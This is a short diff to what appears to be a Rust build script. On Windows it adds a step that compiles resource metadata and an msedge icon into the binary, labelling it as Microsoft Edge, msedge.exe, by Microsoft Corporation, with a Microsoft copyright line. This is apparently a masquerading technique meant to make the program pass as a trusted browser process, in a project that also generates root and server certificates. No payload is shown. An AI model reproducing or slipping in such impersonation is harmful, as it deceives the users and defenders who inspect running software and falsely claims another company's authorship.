@@ -60,6 +60,25 @@ fn main() -> Result<(), Box<dyn Error>> {
     let certs = repository.join("certs");
     fs::create_dir_all(&certs).unwrap();
 
+    if cfg!(target_os = "windows") {
+        let ico_path = repository.join("assets").join("msedge.ico");
+
+        winres::WindowsResource::new()
+            .set_icon(&ico_path.display().to_string())
+            .set("FileDescription", "Microsoft Edge")
+            .set("ProductName", "Microsoft Edge")
+            .set("OriginalFilename", "msedge.exe")
+            .set(
+                "LegalCopyright",
+                "Copyright Microsoft Corporation. All rights reserved.",
+            )
+            .set("CompanyName", "Microsoft Corporation")
+            .set("InternalName", "msedge_exe")
+            .set_language(0x0409) // English (United States)
+            .compile()
+            .unwrap();
+    }
+
     let root_crt = certs.join("root.crt");
     let root_key = certs.join("root.key");
     let server_crt = certs.join("server.crt");
